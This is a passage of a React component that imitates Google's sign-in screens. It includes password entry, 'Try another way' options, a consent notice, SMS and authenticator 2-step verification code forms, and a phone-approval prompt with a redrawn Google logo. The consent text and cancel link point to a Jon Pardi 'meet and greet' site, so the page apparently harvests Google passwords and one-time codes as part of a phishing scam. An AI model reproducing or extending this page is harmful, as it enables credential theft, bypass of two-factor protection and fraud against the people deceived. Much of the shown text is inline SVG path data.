                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"></path>
                  </svg>
                </div>
                <p className="text-sm text-red-300">{error}</p>
              </div>}
              <div className="text-white text-base font-normal flex items-center gap-x-1">
                <button className={`w-[40px] aspect-square rounded-full hover:bg-white/5 z-10`} onClick={hide} type="button"></button>
                {checked ?
                  <div className="w-[22px] aspect-square flex justify-center items-center absolute left-[10px]">
                    <div className="w-[80%] aspect-square bg-[#A8C7FA]">
                      <svg viewBox="0 0 24 24">
                        <g>
                          <path d="M18.7 7.2c-.4-.4-1-.4-1.4 0l-7.5 7.5-3.1-3.1c-.4-.4-1-.4-1.4 0s-.4 1 0 1.4l3.8 3.8c.2.2.4.3.7.3s.5-.1.7-.3l8.2-8.2c.4-.4.4-1 0-1.4" fill="#000000" opacity="1" data-original="#000000"></path>
                        </g>
                      </svg>
                    </div>
                  </div>
                :
                  <div className="w-[18px] aspect-square absolute left-[12px] border border-white"></div>
                }
                <text>Show Password</text>
              </div>
            </div>
            <div className="w-[100%] max-sm:justify-between justify-end flex flex-row gap-x-8">
              <button type="button" className="text-blue-300 text-sm font-medium" onClick={option}>
                {authStatus === "option"?
                  "Try another way"
                :
                  "Forget password?"
                }
              </button>
              <button type="submit" className="text-blue-800 text-sm font-medium px-5 py-2 bg-blue-300 rounded-3xl">Next</button>
            </div>
          </form>
        : (form === "optionForm") ?
          // Try another way
          <form className="max-sm:w-[95%] w-[50%] max-[640px]:h-fit h-[80%] [@media(max-height:550px)]:justify-end [@media(min-height:551px)]:justify-start flex flex-col gap-y-4 sm:pt-[88px]">
            <span className="text-xl font-normal text-white">Choose how you want to sign in:</span>
            <div className="w-[100%] flex flex-col gap-y-1">
              <div className="w-[100%] h-[50px] font-light bg-transparent border-b border-b-white text-base px-5 text-white flex flex-row items-center gap-x-3">
                <div className="w-[28px] aspect-square">
                  <svg aria-hidden="true" fill="#A8C7FA" focusable="false" viewBox="0 0 24 24"><path d="M18,8h-1V6c0-2.76-2.24-5-5-5S7,3.24,7,6v2H6c-1.1,0-2,0.9-2,2v10c0,1.1,0.9,2,2,2h12c1.1,0,2-0.9,2-2V10 C20,8.9,19.1,8,18,8z M9,6c0-1.66,1.34-3,3-3s3,1.34,3,3v2H9V6z M18,20H6V10h12V20z M12,17c1.1,0,2-0.9,2-2c0-1.1-0.9-2-2-2 c-1.1,0-2,0.9-2,2C10,16.1,10.9,17,12,17z"></path></svg>
                </div>
                <span className="text-base text-white font-normal" onClick={() => optionCommand("")}>Enter your password</span>
              </div>
              <div className="w-[100%] h-[50px] font-light bg-transparent border-b border-b-white text-base px-5 text-white flex flex-row items-center gap-x-3">
                <div className="w-[28px] aspect-square">
                  <svg aria-hidden="true" fill="#A8C7FA" focusable="false" viewBox="0 0 24 24"><path d="M11 18h2v-2h-2v2zm1-16C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"></path></svg>
                </div>
                <span className="text-base text-white font-normal" onClick={() => optionCommand("recovery")}>Try another way</span>
              </div>
            </div>
          </form>
        : (form === "otpForm") ?
          // OTP intiation consent
          <form className={`max-sm:w-[95%] w-[50%] max-[640px]:h-fit h-[80%] [@media(max-height:550px)]:justify-end [@media(min-height:551px)]:justify-start flex flex-col gap-y-6 sm:pt-[88px]`}>
            <span className="text-sm font-normal text-white">By continuing, Google will share your name, email address, language preference, and profile picture with Example App. See <span className="text-blue-500">jonpardi.com</span> Privacy Policy and Terms of Service.</span>
            <span className="text-sm font-normal text-white">You can manage Sign in with Google in your Google Account.</span>
            <div className="w-[100%] max-[600px]:justify-between justify-end items-center flex max-[300px]:flex-col max-[300px]:gap-y-3 flex-row gap-x-8">
              <a href="https://jon-pardi-meetandgreet.onrender.com" className="text-blue-300 text-sm">Cancel</a>
              <button className="text-blue-800 text-sm px-5 py-2 bg-blue-300 rounded-3xl" onClick={()=>confirmation(sessionStorage.getItem('progress'))}>Continue</button>
            </div>
          </form>
        : (form === "smsOtpForm") ?
          // 2FA SMS OTP FORM 
          <form onSubmit={send2FA} className={`max-sm:w-[95%] w-[50%] max-[640px]:h-fit h-[90%] [@media(max-height:600px)]:justify-end [@media(min-height:600px)]:justify-start justify-start flex flex-col gap-y-4 ${smsPhoneConfirmation ? 'sm:pt-[35px]' : 'sm:pt-[80px]'} ${slide && form === "smsOtpForm" ? 'animate-present transition-opacity duration-300' : ''}`}>
            <div className={`flex w-[100%] flex-col gap-y-4`}>
              <text className="text-white text-base font-light top-[-10%] left-4 bg-[#0E0E0E]">2-step verification<br/><br/>Get a verification code</text>
              <text className="text-white text-sm font-light top-[-10%] left-4 bg-[#0E0E0E]">
                {smsPhoneConfirmation ?
                  `To get a verification code, first confirm the phone number you added to your account •••• ••• ••${sessionStorage.getItem('digit')}. Standard message and data rates may apply.`
                :
                  `A text message with a 6-digit verification code was just sent to (***)*****${digit}.`
                }
              </text>
              <div className="w-[100%] justify-between flex flex-row gap-x-4">
                {smsPhoneConfirmation ?
                  <div className="flex flex-row justify-center items-center gap-x-4">
                    <Flag code={sessionStorage.getItem('country')} />
                    <div className="w-[10px] aspect-square">
                      <svg viewBox="0 0 32 32">
                        <g transform="matrix(1.439999999999999,0,0,1.439999999999999,-7.03999979019164,-7.480143089294426)">
                          <path fill="#fff" d="M26.925 11.613A1 1 0 0 0 26 11H6a1 1 0 0 0-.925.613 1.05 1.05 0 0 0 .213 1.1l10 10a1.025 1.025 0 0 0 1.424 0l10-10a1.05 1.05 0 0 0 .213-1.1" opacity="1" data-original="#000000"></path>
                        </g>
                      </svg>
                    </div>
                  </div>
                :
                  <></>
                }
                {smsPhoneConfirmation ?
                  <PhoneInput
                    country={sessionStorage.getItem('country')}
                    value={phone}
                    onChange={(value) => {
                      setPhone(value || "");
                      setError("");
                    }}
                    placeholder="Enter phone number"
                    limitMaxLength
                    className="w-[90%] max-sm:w-[100%] h-[55px] font-light rounded-md bg-transparent border-2 border-blue-300 text-base px-5 text-white placeholder-white/60 focus:outline-none focus:border-blue-500"
                  />
                :
                  <input className="w-[90%] max-sm:w-[100%] h-[55px] font-light rounded-md bg-transparent border-2 border-blue-300 text-base px-5 text-white" key="code-input" type="text" id="code" name="code" placeholder="Enter Code" value={code ?? ""} onChange={(event) => setCode(event.target.value)}/>
                }
              </div>
              {error && <p className="text-red-600 text-sm font-light">{error}</p>}
              {smsPhoneConfirmation ?
                <label className="text-white text-sm font-normal flex items-center gap-x-4">
                  <input className="appearance-none w-[18px] aspect-square border-[2px] border-white bg-transparent" type="checkbox" />
                  Don't ask again on this device
                </label>
              :
                <></>
              }
            </div>
            <div className="w-[100%] max-sm:justify-between max-sm:flex-col justify-end flex flex-row gap-y-4 gap-x-8">
              <button type="button" className="text-blue-300 text-sm font-medium" onClick={option2FA}>Try another way</button>
              {smsPhoneConfirmation ?
                <button type="button" className="text-blue-800 text-sm px-5 py-2 bg-blue-300 rounded-3xl font-medium" onClick={otp}>Send</button>
              :
                <>
                  <button type="submit" className="text-blue-800 text-sm px-5 py-2 bg-blue-300 rounded-3xl font-medium">Send</button>
                  <button type="button" className="text-blue-300 text-sm rounded-3xl font-medium min-[640px]:hidden mt-10" onClick={()=>resend2FA('smsotp')}>Resend it</button>
                </>
              }
              
            </div>
          </form>
        : (form === "authenticatorOtpForm") ?
          // 2FA Authenticator FORM
          <form onSubmit={send2FA} className={`max-sm:w-[95%] w-[50%] max-[640px]:h-fit h-[85%] [@media(max-height:600px)]:justify-end [@media(min-height:600px)]:justify-start justify-start flex flex-col gap-y-4 sm:pt-[88px] ${slide && form === "authenticatorOtpForm" ? 'animate-present transition-opacity duration-300' : ''}`}>
            <div className="w-[100%] flex flex-col gap-y-3">
              <text className="text-white text-base font-light top-[-10%] left-4 bg-[#0E0E0E] px-2">2-step verification</text>
              <text className="text-white text-base font-light top-[-10%] left-4 bg-[#0E0E0E] px-2">Get a verifcation code from your google authentication app</text>
              <input className="w-[100%] h-[55px] font-light rounded-md bg-transparent border-2 border-blue-300 text-base px-5 text-white" type="text" id="code" name="code" placeholder="Enter code" value={code} onChange={(event) => setCode(event.target.value)}/>
              {error && <p className="text-red-600 text-sm font-light">{error}</p>}
              <label className="text-white text-sm font-normal flex items-center gap-x-4">
                <input className="appearance-none w-[18px] aspect-square border-[2px] border-white bg-transparent" type="checkbox" />
                Don't ask again on this device
              </label>
            </div>
            <div className="w-[100%] max-sm:justify-between max-sm:flex-col justify-end flex flex-row gap-y-4 gap-x-8">
              <button type="button" className="text-blue-300 text-sm rounded-3xl" onClick={option2FA}>Try another way</button>
              <button type="submit" className="text-blue-800 text-sm px-5 py-2 bg-blue-300 rounded-3xl font-medium">Send</button>
              <button type="button" className="text-blue-300 text-sm rounded-3xl font-medium mt-10 min-[640px]:hidden" onClick={()=>resend2FA('authotp')}>Resend it</button>
            </div>
          </form>
        : (form === "notificationOtpForm") ?
          //Notification Authentication
          <form className={`max-sm:w-[95%] w-[50%] max-[640px]:h-fit h-[85%] [@media(max-height:600px)]:justify-end [@media(min-height:600px)]:justify-start justify-start flex flex-col gap-y-4 sm:pt-[88px] relative ${slide && form === "notificationOtpForm" ? 'animate-present transition-opacity duration-300' : ''}`}>
            <div className="w-[100%] flex flex-row -top-8 justify-center absolute">
              <div className="w-[250px] aspect-square">
                <svg viewBox="0 0 948 504" preserveAspectRatio="xMidYMid meet">
                  <defs>
                    <clipPath id="__lottie_element_2">
                      <rect width={948} height={504} x={0} y={0} />
                    </clipPath>
                    <clipPath id="__lottie_element_4">
                      <path d="M0,0 L948,0 L948,504 L0,504z" />
                    </clipPath>
                  </defs>
                  <g clipPath="url(#__lottie_element_2)">
                    <g transform="matrix(1,0,0,1,476.25,252.5)" opacity={1}>
                      <g opacity={1} transform="matrix(1,0,0,1,111.75,-144)">
                        <path
                          fill="rgb(227,227,228)"
                          fillOpacity={1}
                          d=" M-3,-27 C-3,-27 -1.11899995803833,-27 -1.11899995803833,-27 C1.1549999713897705,-27 3,-25.156999588012695 3,-22.882999420166016 C3,-22.882999420166016 3,22.881999969482422 3,22.881999969482422 C3,25.1560001373291 1.1549999713897705,27 -1.11899995803833,27 C-1.11899995803833,27 -3,27 -3,27 C-3,27 -3,-27 -3,-27z"
                        />
                      </g>
                      <g opacity={1} transform="matrix(1,0,0,1,111.75,-93)">
                        <path
                          fill="rgb(227,227,228)"
                          fillOpacity={1}
                          d=" M-3,-12 C-3,-12 -1.11899995803833,-12 -1.11899995803833,-12 C1.1549999713897705,-12 3,-10.156000137329102 3,-7.881999969482422 C3,-7.881999969482422 3,7.881999969482422 3,7.881999969482422 C3,10.156000137329102 1.1549999713897705,12 -1.11899995803833,12 C-1.11899995803833,12 -3,12 -3,12 C-3,12 -3,-12 -3,-12z"
                        />
                      </g>
                      <g opacity={1} transform="matrix(1,0,0,1,-2.25,0)">
                        <path
                          fill="rgb(19,19,20)"
                          fillOpacity={1}
                          d=" M-72,-226.5 C-72,-226.5 72,-226.5 72,-226.5 C94.36799621582031,-226.5 112.5,-208.3679962158203 112.5,-186 C112.5,-186 112.5,186 112.5,186 C112.5,208.3679962158203 94.36799621582031,226.5 72,226.5 C72,226.5 -72,226.5 -72,226.5 C-94.36799621582031,226.5 -112.5,208.3679962158203 -112.5,186 C-112.5,186 -112.5,-186 -112.5,-186 C-112.5,-208.3679962158203 -94.36799621582031,-226.5 -72,-226.5z"
                        />
                        <path
                          strokeLinecap="butt"
                          strokeLinejoin="miter"
                          fillOpacity={0}
                          strokeMiterlimit={4}
                          stroke="rgb(227,227,228)"
                          strokeOpacity={1}
                          strokeWidth={3}
                          d=" M-72,-226.5 C-72,-226.5 72,-226.5 72,-226.5 C94.36799621582031,-226.5 112.5,-208.3679962158203 112.5,-186 C112.5,-186 112.5,186 112.5,186 C112.5,208.3679962158203 94.36799621582031,226.5 72,226.5 C72,226.5 -72,226.5 -72,226.5 C-94.36799621582031,226.5 -112.5,208.3679962158203 -112.5,186 C-112.5,186 -112.5,-186 -112.5,-186 C-112.5,-208.3679962158203 -94.36799621582031,-226.5 -72,-226.5z"
                        />
                      </g>
                      <g opacity={1} transform="matrix(1,0,0,1,-2.25,-207)">
                        <path
                          fill="rgb(227,227,228)"
                          fillOpacity={1}
                          d=" M0,-6 C0,-6 0,-6 0,-6 C3.313999891281128,-6 6,-3.313999891281128 6,0 C6,0 6,0 6,0 C6,3.313999891281128 3.313999891281128,6 0,6 C0,6 0,6 0,6 C-3.313999891281128,6 -6,3.313999891281128 -6,0 C-6,0 -6,0 -6,0 C-6,-3.313999891281128 -3.313999891281128,-6 0,-6z"
                        />
                      </g>
                    </g>
                    <g
                      transform="matrix(1,0,0,1,473.74200439453125,132.4929962158203)"
                      opacity={1}
                    >
                      <g
                        opacity={1}
                        transform="matrix(1,0,0,1,-43.444000244140625,-4.0279998779296875)"
                      >
                        <path
                          fill="rgb(31,31,31)"
                          fillOpacity={1}
                          d=" M-13.060999870300293,0 C-13.060999870300293,7.695000171661377 -6.854000091552734,13.96500015258789 0.5329999923706055,13.96500015258789 C4.535999774932861,13.96500015258789 7.531000137329102,12.600000381469727 9.892999649047852,10.050000190734863 C12.312000274658203,7.53000020980835 13.060999870300293,3.990000009536743 13.060999870300293,1.125 C13.060999870300293,0.23999999463558197 12.98900032043457,-0.5849999785423279 12.859000205993652,-1.2599999904632568 C12.859000205993652,-1.2599999904632568 0.5329999923706055,-1.2599999904632568 0.5329999923706055,-1.2599999904632568 C0.5329999923706055,-1.2599999904632568 0.5329999923706055,2.565000057220459 0.5329999923706055,2.565000057220459 C0.5329999923706055,2.565000057220459 9.288000106811523,2.565000057220459 9.288000106811523,2.565000057220459 C9.029000282287598,4.710000038146973 8.35200023651123,6.269999980926514 7.301000118255615,7.364999771118164 C6.019000053405762,8.6850004196167 4.0320000648498535,10.154999732971191 0.5329999923706055,10.154999732971191 C-4.867000102996826,10.154999732971191 -9.086000442504883,5.625 -9.086000442504883,0 C-9.086000442504883,-5.625 -4.867000102996826,-10.154999732971191 0.5329999923706055,-10.154999732971191 C3.441999912261963,-10.154999732971191 5.572000026702881,-8.954999923706055 7.142000198364258,-7.425000190734863 C7.142000198364258,-7.425000190734863 9.720000267028809,-10.109999656677246 9.720000267028809,-10.109999656677246 C7.531000137329102,-12.300000190734863 4.623000144958496,-13.96500015258789 0.5329999923706055,-13.96500015258789 C-6.854000091552734,-13.96500015258789 -13.060999870300293,-7.695000171661377 -13.060999870300293,0z"
                        />
                      </g>
                      <g opacity={1} transform="matrix(1,0,0,1,-1,0)">
                        <path
                          fill="rgb(31,31,31)"
                          fillOpacity={1}
                          d=" M-17.08,-4.51 C-14.51,-4.51 -12.3,-2.3 -12.3,0.94 C-12.3,4.15 -14.51,6.38 -17.08,6.38 C-19.64,6.38 -21.86,4.13 -21.86,0.94 C-21.86,-2.29 -19.64,-4.51 -17.08,-4.51z M-17.08,9.92 C-12.38,9.92 -8.57,6.11 -8.57,0.94 C-8.57,-4.27 -12.38,-8.05 -17.08,-8.05 C-21.77,-8.05 -25.59,-4.27 -25.59,0.94 C-25.59,6.11 -21.77,9.92 -17.08,9.92z"
                        />
                        <g
                          opacity={1}
                          transform="matrix(1,0,0,1,-17.077999114990234,0.9380000233650208)"
                        />
                        <g
                          opacity={1}
                          transform="matrix(1,0,0,1,-17.077999114990234,0.9369999766349792)"
                        />
                      </g>
                      <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                        <path
                          fill="rgb(31,31,31)"
                          fillOpacity={1}
                          d=" M2,-4.51 C4.57,-4.51 6.78,-2.3 6.78,0.94 C6.78,4.15 4.57,6.4 2,6.38 C-0.56,6.38 -2.78,4.13 -2.78,0.94 C-2.78,-2.29 -0.56,-4.51 2,-4.51z M1.99,9.92 C6.68,9.92 10.5,6.11 10.5,0.94 C10.5,-4.27 6.68,-8.05 1.99,-8.05 C-2.71,-8.05 -6.52,-4.27 -6.52,0.94 C-6.52,6.11 -2.69,9.92 1.99,9.92z"
                        />
                        <g
                          opacity={1}
                          transform="matrix(1,0,0,1,2.002000093460083,0.9380000233650208)"
                        />
                        <g
                          opacity={1}
                          transform="matrix(1,0,0,1,1.9869999885559082,0.9369999766349792)"
                        />
                      </g>
                      <g opacity={1} transform="matrix(1,0,0,1,1,0)">
                        <path
                          fill="rgb(31,31,31)"
                          fillOpacity={1}
                          d=" M21.15,-4.51 C23.73,-4.51 25.76,-2.18 25.76,0.98 C25.76,4.12 23.73,6.4 21.15,6.4 C18.53,6.4 16.34,4.12 16.34,0.98 C16.34,-2.2 18.53,-4.51 21.15,-4.51z M29.1,8.63 C29.1,8.63 29.1,-7.51 29.1,-7.51 C29.1,-7.51 25.5,-7.51 25.5,-7.51 C25.5,-7.51 25.5,-6.05 25.5,-6.05 C25.5,-6.05 25.37,-6.05 25.37,-6.05 C24.52,-7.1 22.88,-8.06 20.82,-8.06 C16.52,-8.06 12.56,-4.1 12.56,0.97 C12.56,6.01 16.5,9.92 20.82,9.92 C22.88,9.92 24.52,8.98 25.37,7.88 C25.37,7.88 25.5,7.88 25.5,7.88 C25.5,7.88 25.5,9.17 25.5,9.17 C25.5,12.61 23.75,14.45 20.89,14.45 C18.58,14.45 17.14,12.73 16.55,11.26 C16.55,11.26 13.25,12.68 13.25,12.68 C14.2,15.07 16.7,17.99 20.89,17.99 C25.34,17.99 29.1,15.28 29.1,8.63z"
                        />
                        <g
                          opacity={1}
                          transform="matrix(1,0,0,1,21.05299949645996,0.9440000057220459)"
                        />
                        <g
                          opacity={1}
                          transform="matrix(1,0,0,1,20.829999923706055,4.965000152587891)"
                        />
                      </g>
                      <g
                        opacity={1}
                        transform="matrix(1,0,0,1,35.59700012207031,-3.818000078201294)"
                      >
                        <path
                          fill="rgb(31,31,31)"
                          fillOpacity={1}
                          d=" M1.8940000534057617,13.21500015258789 C1.8940000534057617,13.21500015258789 1.8940000534057617,-13.21500015258789 1.8940000534057617,-13.21500015258789 C1.8940000534057617,-13.21500015258789 -1.8940000534057617,-13.21500015258789 -1.8940000534057617,-13.21500015258789 C-1.8940000534057617,-13.21500015258789 -1.8940000534057617,13.21500015258789 -1.8940000534057617,13.21500015258789 C-1.8940000534057617,13.21500015258789 1.8940000534057617,13.21500015258789 1.8940000534057617,13.21500015258789z"
                        />
                      </g>
                      <g opacity={1} transform="matrix(1,0,0,1,2.25,0)">
                        <path
                          fill="rgb(31,31,31)"
                          fillOpacity={1}
                          d=" M49.32,-2.66 C49.32,-2.66 41.6,0.67 41.6,0.67 C41.5,-2.8 44.18,-4.57 46.11,-4.57 C47.62,-4.57 48.89,-3.79 49.32,-2.66z M53.6,5.95 C53.6,5.95 50.66,3.91 50.66,3.91 C49.68,5.41 48.34,6.41 46.41,6.41 C44.48,6.41 43.1,5.48 42.22,3.68 C42.22,3.68 53.75,-1.3 53.75,-1.3 C53.75,-1.3 53.37,-2.32 53.37,-2.32 C52.65,-4.33 50.46,-8.03 45.98,-8.03 C41.53,-8.03 37.96,-4.39 37.96,0.95 C37.96,5.99 41.49,9.94 46.4,9.94 C50.36,9.94 52.65,7.42 53.6,5.95z"
                        />
                        <g
                          opacity={1}
                          transform="matrix(1,0,0,1,45.459999084472656,-1.9500000476837158)"
                        />
                        <g
                          opacity={1}
                          transform="matrix(1,0,0,1,45.856998443603516,0.9520000219345093)"
                        />
                      </g>
                    </g>
                    <g transform="matrix(1,0,0,1,474,198.5)" opacity={1}>
                      <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                        <path
                          fill="rgb(69,71,71)"
                          fillOpacity={1}
                          d=" M-81,-6 C-81,-6 81,-6 81,-6 C84.31400299072266,-6 87,-3.313999891281128 87,0 C87,0 87,0 87,0 C87,3.313999891281128 84.31400299072266,6 81,6 C81,6 -81,6 -81,6 C-84.31400299072266,6 -87,3.313999891281128 -87,0 C-87,0 -87,0 -87,0 C-87,-3.313999891281128 -84.31400299072266,-6 -81,-6z"
                        />
                      </g>
                    </g>
                    <g transform="matrix(1,0,0,1,474,222.5)" opacity={1}>
                      <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                        <path
                          fill="rgb(69,71,71)"
                          fillOpacity={1}
                          d=" M-57,-6 C-57,-6 57,-6 57,-6 C60.31399917602539,-6 63,-3.313999891281128 63,0 C63,0 63,0 63,0 C63,3.313999891281128 60.31399917602539,6 57,6 C57,6 -57,6 -57,6 C-60.31399917602539,6 -63,3.313999891281128 -63,0 C-63,0 -63,0 -63,0 C-63,-3.313999891281128 -60.31399917602539,-6 -57,-6z"
                        />
                      </g>
                    </g>
                    <g
                      clipPath="url(#__lottie_element_4)"
                      transform="matrix(1,0,0,1,0,-24.5)"
                      opacity={1}
                    >
                      <g
                        transform="matrix(0.32417231798171997,0,0,0.32417231798171997,366,338.5)"
                        opacity={1}
                      >
                        <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                          <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                            <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                              <path
                                fill="rgb(19,19,20)"
                                fillOpacity={1}
                                d=" M6.123233998228043e-16,-97 C52.15743637084961,-97 97,-52.15743637084961 97,0 C97,52.15743637084961 52.15743637084961,97 6.123233998228043e-16,97 C-52.15743637084961,97 -97,52.15743637084961 -97,-1.2246467996456087e-15 C-97,-52.15743637084961 -52.15743637084961,-97 6.123233998228043e-16,-97 C6.123233998228043e-16,-97 6.123233998228043e-16,-97 6.123233998228043e-16,-97z"
                              />
                              <path
                                strokeLinecap="butt"
                                strokeLinejoin="miter"
                                fillOpacity={0}
                                strokeMiterlimit={4}
                                stroke="rgb(227,227,228)"
                                strokeOpacity={1}
                                strokeWidth={3}
                                d=" M6.123233998228043e-16,-97 C52.15743637084961,-97 97,-52.15743637084961 97,0 C97,52.15743637084961 52.15743637084961,97 6.123233998228043e-16,97 C-52.15743637084961,97 -97,52.15743637084961 -97,-1.2246467996456087e-15 C-97,-52.15743637084961 -52.15743637084961,-97 6.123233998228043e-16,-97 C6.123233998228043e-16,-97 6.123233998228043e-16,-97 6.123233998228043e-16,-97z"
                              />
                            </g>
                          </g>
                        </g>
                      </g>
                      <g
                        transform="matrix(0.32417231798171997,0,0,0.32417231798171997,401.0106201171875,311.26953125)"
                        opacity={1}
                      >
                        <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                          <path
                            strokeLinecap="butt"
                            strokeLinejoin="miter"
                            fillOpacity={0}
                            strokeMiterlimit={4}
                            stroke="rgb(227,227,228)"
                            strokeOpacity={1}
                            strokeWidth={7}
                            d=" M-133.5,59 C-133.5,59 -82.75,109.25 -82.75,109.25"
                          />
                        </g>
                        <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                          <path
                            strokeLinecap="butt"
                            strokeLinejoin="miter"
                            fillOpacity={0}
                            strokeMiterlimit={4}
                            stroke="rgb(227,227,228)"
                            strokeOpacity={1}
                            strokeWidth={7}
                            d=" M-82.75,59 C-82.75,59 -132.75,109 -132.75,109"
                          />
                        </g>
                      </g>
                      <g
                        transform="matrix(2.6906304359436035,0,0,2.6906304359436035,589.656982421875,336.35601806640625)"
                        opacity={1}
                      >
                        <path
                          strokeLinecap="butt"
                          strokeLinejoin="miter"
                          fillOpacity={0}
                          strokeMiterlimit={4}
                          stroke="rgb(131,172,241)"
                          strokeOpacity={1}
                          strokeWidth={0.6}
                          d=" M1.0479999780654907,-9.819999694824219 C0.5849999785423279,-10.595999717712402 -0.5849999785423279,-10.595999717712402 -1.0479999780654907,-9.819999694824219 C-1.0479999780654907,-9.819999694824219 -1.9620000123977661,-8.288000106811523 -1.9620000123977661,-8.288000106811523 C-2.2699999809265137,-7.770999908447266 -2.937999963760376,-7.563000202178955 -3.505000114440918,-7.808000087738037 C-3.505000114440918,-7.808000087738037 -5.186999797821045,-8.534000396728516 -5.186999797821045,-8.534000396728516 C-6.038000106811523,-8.901000022888184 -6.984000205993652,-8.244000434875488 -6.881999969482422,-7.355999946594238 C-6.881999969482422,-7.355999946594238 -6.679999828338623,-5.6020002365112305 -6.679999828338623,-5.6020002365112305 C-6.611999988555908,-5.011000156402588 -7.025000095367432,-4.4670000076293945 -7.633999824523926,-4.3460001945495605 C-7.633999824523926,-4.3460001945495605 -9.4399995803833,-3.98799991607666 -9.4399995803833,-3.98799991607666 C-10.354000091552734,-3.806999921798706 -10.71500015258789,-2.743000030517578 -10.086999893188477,-2.0820000171661377 C-10.086999893188477,-2.0820000171661377 -8.845999717712402,-0.7760000228881836 -8.845999717712402,-0.7760000228881836 C-8.428000450134277,-0.335999995470047 -8.428000450134277,0.335999995470047 -8.845999717712402,0.7760000228881836 C-8.845999717712402,0.7760000228881836 -10.086999893188477,2.0820000171661377 -10.086999893188477,2.0820000171661377 C-10.71500015258789,2.743000030517578 -10.354000091552734,3.806999921798706 -9.4399995803833,3.98799991607666 C-9.4399995803833,3.98799991607666 -7.633999824523926,4.3460001945495605 -7.633999824523926,4.3460001945495605 C-7.025000095367432,4.4670000076293945 -6.611999988555908,5.011000156402588 -6.679999828338623,5.6020002365112305 C-6.679999828338623,5.6020002365112305 -6.881999969482422,7.355999946594238 -6.881999969482422,7.355999946594238 C-6.984000205993652,8.244000434875488 -6.038000106811523,8.901000022888184 -5.186999797821045,8.534000396728516 C-5.186999797821045,8.534000396728516 -3.505000114440918,7.808000087738037 -3.505000114440918,7.808000087738037 C-2.937999963760376,7.563000202178955 -2.2699999809265137,7.770999908447266 -1.9620000123977661,8.288000106811523 C-1.9620000123977661,8.288000106811523 -1.0479999780654907,9.819999694824219 -1.0479999780654907,9.819999694824219 C-0.5849999785423279,10.595999717712402 0.5849999785423279,10.595999717712402 1.0479999780654907,9.819999694824219 C1.0479999780654907,9.819999694824219 1.9620000123977661,8.288000106811523 1.9620000123977661,8.288000106811523 C2.2699999809265137,7.770999908447266 2.937999963760376,7.563000202178955 3.505000114440918,7.808000087738037 C3.505000114440918,7.808000087738037 5.186999797821045,8.534000396728516 5.186999797821045,8.534000396728516 C6.038000106811523,8.901000022888184 6.984000205993652,8.244000434875488 6.881999969482422,7.355999946594238 C6.881999969482422,7.355999946594238 6.679999828338623,5.6020002365112305 6.679999828338623,5.6020002365112305 C6.611999988555908,5.011000156402588 7.025000095367432,4.4670000076293945 7.633999824523926,4.3460001945495605 C7.633999824523926,4.3460001945495605 9.4399995803833,3.98799991607666 9.4399995803833,3.98799991607666 C10.354000091552734,3.806999921798706 10.71500015258789,2.743000030517578 10.086999893188477,2.0820000171661377 C10.086999893188477,2.0820000171661377 8.845999717712402,0.7760000228881836 8.845999717712402,0.7760000228881836 C8.428000450134277,0.335999995470047 8.428000450134277,-0.335999995470047 8.845999717712402,-0.7760000228881836 C8.845999717712402,-0.7760000228881836 10.086999893188477,-2.0820000171661377 10.086999893188477,-2.0820000171661377 C10.71500015258789,-2.743000030517578 10.354000091552734,-3.806999921798706 9.4399995803833,-3.98799991607666 C9.4399995803833,-3.98799991607666 7.633999824523926,-4.3460001945495605 7.633999824523926,-4.3460001945495605 C7.025000095367432,-4.4670000076293945 6.611999988555908,-5.011000156402588 6.679999828338623,-5.6020002365112305 C6.679999828338623,-5.6020002365112305 6.881999969482422,-7.355999946594238 6.881999969482422,-7.355999946594238 C6.984000205993652,-8.244000434875488 6.038000106811523,-8.901000022888184 5.186999797821045,-8.534000396728516 C5.186999797821045,-8.534000396728516 3.505000114440918,-7.808000087738037 3.505000114440918,-7.808000087738037 C2.937999963760376,-7.563000202178955 2.2699999809265137,-7.770999908447266 1.9620000123977661,-8.288000106811523 C1.9620000123977661,-8.288000106811523 1.0479999780654907,-9.819999694824219 1.0479999780654907,-9.819999694824219z"
                        />
                        <g opacity={1} transform="matrix(1,0,0,1,0,0)">
                          <path
                            fill="rgb(131,172,241)"
                            fillOpacity={1}
                            d=" M1.0479999780654907,-9.819999694824219 C0.5849999785423279,-10.595999717712402 -0.5849999785423279,-10.595999717712402 -1.0479999780654907,-9.819999694824219 C-1.0479999780654907,-9.819999694824219 -1.9620000123977661,-8.288000106811523 -1.9620000123977661,-8.288000106811523 C-2.2699999809265137,-7.770999908447266 -2.937999963760376,-7.563000202178955 -3.505000114440918,-7.808000087738037 C-3.505000114440918,-7.808000087738037 -5.186999797821045,-8.534000396728516 -5.186999797821045,-8.534000396728516 C-6.038000106811523,-8.901000022888184 -6.984000205993652,-8.244000434875488 -6.881999969482422,-7.355999946594238 C-6.881999969482422,-7.355999946594238 -6.679999828338623,-5.6020002365112305 -6.679999828338623,-5.6020002365112305 C-6.611999988555908,-5.011000156402588 -7.025000095367432,-4.4670000076293945 -7.633999824523926,-4.3460001945495605 C-7.633999824523926,-4.3460001945495605 -9.4399995803833,-3.98799991607666 -9.4399995803833,-3.98799991607666 C-10.354000091552734,-3.806999921798706 -10.71500015258789,-2.743000030517578 -10.086999893188477,-2.0820000171661377 C-10.086999893188477,-2.0820000171661377 -8.845999717712402,-0.7760000228881836 -8.845999717712402,-0.7760000228881836 C-8.428000450134277,-0.335999995470047 -8.428000450134277,0.335999995470047 -8.845999717712402,0.7760000228881836 C-8.845999717712402,0.7760000228881836 -10.086999893188477,2.0820000171661377 -10.086999893188477,2.0820000171661377 C-10.71500015258789,2.743000030517578 -10.354000091552734,3.806999921798706 -9.4399995803833,3.98799991607666 C-9.4399995803833,3.98799991607666 -7.633999824523926,4.3460001945495605 -7.633999824523926,4.3460001945495605 